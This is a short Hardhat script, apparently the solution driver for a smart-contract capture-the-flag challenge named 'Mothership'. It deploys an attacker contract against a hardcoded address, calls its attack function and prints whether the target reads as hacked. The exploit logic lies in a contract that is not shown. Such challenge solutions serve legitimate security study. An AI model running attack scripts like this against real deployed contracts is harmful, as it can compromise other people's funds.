import { ethers } from "hardhat";

const contractAddress = "0x3830e9992bDF90A93D9Fe6711BDA6C892Ff1c06f";

async function main() {
  const attackerContract = await (
    await ethers.getContractFactory("ChallengeMothershipAttacker")
  ).deploy(contractAddress);
  await attackerContract.deployed();

  const tx = await attackerContract.attack();
  await tx.wait();

  const contract = (await ethers.getContractFactory("Mothership")).attach(contractAddress);
  console.log("hacked", await contract.hacked());
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
